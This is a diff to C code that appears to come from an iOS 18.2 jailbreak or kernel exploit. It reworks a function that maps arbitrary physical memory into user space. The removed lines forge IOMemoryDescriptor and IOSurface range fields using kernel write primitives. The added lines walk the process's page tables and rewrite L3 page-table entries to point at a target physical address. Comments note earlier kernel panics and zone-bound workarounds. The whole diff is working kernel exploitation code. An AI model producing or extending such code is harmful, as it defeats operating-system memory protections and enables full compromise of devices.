@@ -158,10 +158,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// that only matters in the already-failing case).
 	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
 	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
-	// v78: REORDER — v77 win0 (pure control) mapped with lookup=1, base!=0;
-	// every rewritten window had lookup=0; so rewrite AFTER lookup, then let
-	// GetBaseAddress re-walk the retargeted descriptor. No pokes (retired),
-	// flags via 32-bit write.
+	// v81: PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
+	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
+	// maps (C,first=0x539,0 = own surface ID in all 20 windows). So: take
+	// the surface's own valid 64KB mapping and rewrite its L3 PTEs to the
+	// target PA. No descriptor/surface writes at all — teardown-safe.
 	static unsigned g_kmap_seq = 0;
 	unsigned seq = g_kmap_seq++;
 	jb_tr_beacon("KMAP win=%u", seq);
@@ -195,10 +196,15 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	// v78 PHASE A: lookup on the INTACT descriptor (the only proven-working
-	// configuration). NO GetBaseAddress here — v79 keeps the call cold so
-	// the post-rewrite call is the FIRST one (v78 proved a warmed call
-	// returns the original mapping).
+	// v81 PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
+	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
+	// maps (C,first=0x539,0 = own surface ID in all 20 windows, descriptor
+	// AND surface.ranges retargeted and verified). New path: take the
+	// surface's own valid 64KB mapping and rewrite its L3 PTEs to the
+	// target PA. NO IOSurface writes at all — the exit-during-rewrite
+	// panic class (00:07:39) dies here. PTE writes sit inside 4KB L3
+	// table pages (RMW LAW v2 satisfied; window is 32B-aligned, 64KB-
+	// aligned base0 ⇒ PTE index multiple of 4).
 	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
 	if (!refA) {
@@ -206,91 +212,64 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-
-	// v78 PHASE B: retarget the descriptor AFTER lookup. The tail
-	// GetBaseAddress re-walks this descriptor and maps the new ranges.
-	if (gPrimitives.krwMinSafeReadSize > 0x10) {
-		jb_tr_beacon("KMAP path,fakeranges,minsafe=%x", gPrimitives.krwMinSafeReadSize);
-		// If the primitive we have cannot read <=0x10 bytes at a time, we need to create our own struct
-		// And later clean it up when we have a better primitive in IOSurface_map_cleanup
-		uint64_t *fakeRanges = malloc(2 * sizeof(uint64_t));
-		fakeRanges[0] = pa;
-		fakeRanges[1] = size;
-
-		uint64_t fakeRanges_kva = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
-		jb_tr_beacon("KMAP fakeranges,kva=%llx", (unsigned long long)fakeRanges_kva);
-		IOMemoryDescriptor_set_ranges(desc, fakeRanges_kva);
-		// v75: verify the swap via the DESC field only (never read the
-		// 16-byte ranges element through the primitive).
-		jb_tr_beacon("KMAP rb,ranges,now=%llx,expect=%llx",
-		             (unsigned long long)IOMemoryDescriptor_get_ranges(desc),
-		             (unsigned long long)fakeRanges_kva);
-		cleanups = realloc(cleanups, ++cleanupsCount * sizeof(struct IOSurface_toCleanup));
-		cleanups[cleanupsCount-1].descriptor = desc;
-		cleanups[cleanupsCount-1].origRanges = ranges;
-		cleanups[cleanupsCount-1].fakeRangesUA = fakeRanges;
-		// v80: the IOSurface KERNEL OBJECT carries its own ranges copy —
-		// IOSurface.ranges@0x360 (KPF table). RMW LAW v2: the 32-byte
-		// primitive window must stay INSIDE the object — the IOSurface zone
-		// element is 960 bytes (0x3c0, proven by the 23:38:04 panic where
-		// kwrite32 at rangeCount@0x3a4 overran its end by 4 bytes). 0x360's
-		// window ends at 0x380 — safe. rangeCount is NOT writable by
-		// primitive and is assumed 1 (single-range surface, matches desc).
-		kwrite64(surface + 0x360, fakeRanges_kva);
-		jb_tr_beacon("KMAP rb,surface,r360=%llx,expect=%llx",
-		             (unsigned long long)kread64(surface + 0x360),
-		             (unsigned long long)fakeRanges_kva);
-	}
-	else {
-		// v75 NOTE: this branch (minsafe<=0x10) writes the 16-byte ranges
-		// ELEMENT via kwrite64 — ClearSword's 32-byte RMW would trip zone
-		// bound checks on it (panic 2026-09-05 21:37:02 class). Branch is
-		// dead today (minsafe=0x20) but must never run without rework.
-		kwrite64(ranges, pa);
-		kwrite64(ranges+8, size);
+	void *base0 = IOSurfaceGetBaseAddress(refA);
+	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
+	if (!base0) {
+		jb_tr_beacon("KMAP fail,base0A");
+		*uaddr = NULL;
+		return -1;
 	}
 
-	IOMemoryDescriptor_set_size(desc, size);
-
-	// v77: the 0x70/0x18/0x90 zeroing pokes are RETIRED — v76's A/B proved
-	// skip == apply (identical lookup=0 everywhere), and on 18.2 these fields
-	// held real kernel pointers. Pre-rewrite values are in KMAP pre,desc.
-
-	IOMemoryDescriptor_set_wired(desc, true);
-
-	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
-	// v76: 32-bit flags write — the 8-bit setter can never clear the
-	// 0x400 bit (byte 1) of the 0x410 mask on 18.2.
-	uint32_t newflags = (flags & ~0x410) | 0x20;
-	kwrite32(desc + 0x20, newflags);
-	jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
-
-	IOMemoryDescriptor_set_memRef(desc, 0);
-
-	// v75: full post-rewrite desc readback — diff against `pre,desc` names
-	// the exact setter that mangled (or failed to mangle) the descriptor.
-	jb_tr_beacon("KMAP post,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
-	             (unsigned long long)kread64(desc + 0x60),
-	             (unsigned long long)kread64(desc + 0x50),
-	             (unsigned int)kread32(desc + 0x20),
-	             (unsigned long long)kread64(desc + 0x28),
-	             (unsigned int)kread8(desc + 0x88),
-	             (unsigned long long)kread64(desc + 0x70),
-	             (unsigned long long)kread64(desc + 0x18),
-	             (unsigned long long)kread64(desc + 0x90));
-
-	// v79 PHASE C: FIRST (cold) GetBaseAddress — after the full retarget.
-	// If the surface-field rewrite is what the mapper reads, this maps the
-	// requested PA. First qwords discriminate: identical/zero-ish pattern in
-	// every window = own memory again; per-PA varying content = retargeted.
-	void *base1 = IOSurfaceGetBaseAddress(refA);
-	jb_tr_beacon("KMAP C,base=%llx", (unsigned long long)(uintptr_t)base1);
-	if (base1) {
-		jb_tr_beacon("KMAP C,first=%llx,%llx",
-		             (unsigned long long)*(volatile uint64_t *)base1,
-		             (unsigned long long)((volatile uint64_t *)base1)[1]);
+	// Walk our own user page tables: 16KB granule, 4 levels.
+	// L3 idx = VA[24:14], L2 idx = VA[35:25], L1 idx = VA[46:36],
+	// L0 idx = VA[47], OA = PTE bits [47:14].
+	uint64_t va   = (uint64_t)base0;
+	uint64_t tt   = ttep_self();
+	uint64_t l0e  = kread64(tt + 8 * ((va >> 47) & 0x1));
+	uint64_t l1   = phystokv(l0e & 0x0000FFFFFFFFC000ULL);
+	uint64_t l1e  = kread64(l1 + 8 * ((va >> 36) & 0x7FF));
+	uint64_t l2   = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
+	uint64_t l2e  = kread64(l2 + 8 * ((va >> 25) & 0x7FF));
+	uint64_t l3   = phystokv(l2e & 0x0000FFFFFFFFC000ULL);
+	uint64_t pteA = l3 + 8 * ((va >> 14) & 0x7FF);
+	if (!l1 || !l2 || !l3) {
+		jb_tr_beacon("KMAP fail,ptewalk,l1=%llx,l2=%llx,l3=%llx",
+		             (unsigned long long)l1, (unsigned long long)l2,
+		             (unsigned long long)l3);
+		*uaddr = NULL;
+		return -1;
 	}
-	*uaddr = base1;
+	// Sanity: the walk must reproduce what vtophys says about base0 —
+	// otherwise we are looking at the wrong table and MUST NOT write.
+	uint64_t origPte = kread64(pteA);
+	uint64_t walked  = origPte & 0x0000FFFFFFFFC000ULL;
+	uint64_t expect  = vtophys(tt, va) & ~0x3FFFULL;
+	if (walked != expect) {
+		jb_tr_beacon("KMAP fail,pteverify,walked=%llx,expect=%llx",
+		             (unsigned long long)walked, (unsigned long long)expect);
+		*uaddr = NULL;
+		return -1;
+	}
+	// Retarget 4 consecutive 16KB pages → the 64KB window. Keep attrs,
+	// drop the old OA (bits 47:14), clear CONTIGUOUS (bit 52) — the target
+	// is 16KB-aligned, not block-aligned with the old mapping.
+	uint64_t attr   = origPte & ~0x0000FFFFFFFFC000ULL;
+	attr           &= ~(1ULL << 52);
+	uint64_t paPage = pa & ~0x3FFFULL;
+	for (int pgi = 0; pgi < 4; pgi++) {
+		uint64_t newPte = attr | ((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
+		kwrite64(pteA + 8 * pgi, newPte);
+	}
+	jb_tr_beacon("KMAP pte,ok,pteA=%llx,pa=%llx,rb0=%llx,rb3=%llx",
+	             (unsigned long long)pteA, (unsigned long long)paPage,
+	             (unsigned long long)kread64(pteA),
+	             (unsigned long long)kread64(pteA + 24));
+
+	// First read through the retargeted mapping — the probe's scan follows.
+	jb_tr_beacon("KMAP PTE,first=%llx,%llx",
+	             (unsigned long long)*(volatile uint64_t *)base0,
+	             (unsigned long long)((volatile uint64_t *)base0)[1]);
+	*uaddr = base0;
 	return 0;
 }
 
